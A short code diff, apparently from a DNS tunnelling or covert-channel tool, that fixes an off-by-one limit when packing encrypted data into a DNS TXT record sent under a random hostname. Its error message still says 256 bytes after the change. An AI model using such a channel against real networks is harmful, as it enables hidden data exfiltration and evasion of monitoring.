@@ -97,10 +97,10 @@ def forge_dns_query(data: str):
     hostname = get_random_hostname()
     encrypted_data = b""
     # encrypted_data = ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
-    if len(data) > 256:
+    if len(data) > 255:
         print("ERROR: Can't fit more than 256 bytes in TXT record!")
         print("Truncating data...")
-        truncated_data = data[0:256]
+        truncated_data = data[0:255]
         encrypted_data = ENCRYPTION_HANDLER.encrypt(truncated_data.encode("utf-8"))
     else:
         encrypted_data = ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
